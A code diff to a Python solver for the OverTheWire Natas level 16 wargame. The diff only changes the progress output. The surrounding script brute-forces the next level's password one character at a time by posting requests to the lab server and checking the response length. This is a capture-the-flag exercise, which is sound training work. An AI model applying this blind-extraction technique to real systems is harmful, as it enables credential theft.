@@ -1,7 +1,7 @@
 import requests
+import sys
 
 def flag(url,username,password):
-    print("Extracting flag: ")
     site = requests.get(url,auth=(username,password))
     if site.status_code == 401:
         print("Wrong credentials")
@@ -17,12 +17,13 @@ def flag(url,username,password):
                 }
         content = requests.post(url,auth=(username,password),data=post_data)
         if len(content.text) == 461926:
+            sys.stdout.write(f"\rExtracting flag: {flag}{alpha_num[letter].ljust(20)}")
+            sys.stdout.flush()
             letter += 1
         else:
             flag = flag + alpha_num[letter]
-            print(flag)
             letter = 0
-    print("The flag for natas16 is: " + flag)
+    print(f"\rThe flag for natas16 is: {flag.ljust(20)}")
 
 if __name__=="__main__":
     url = "http://natas16.natas.labs.overthewire.org/"
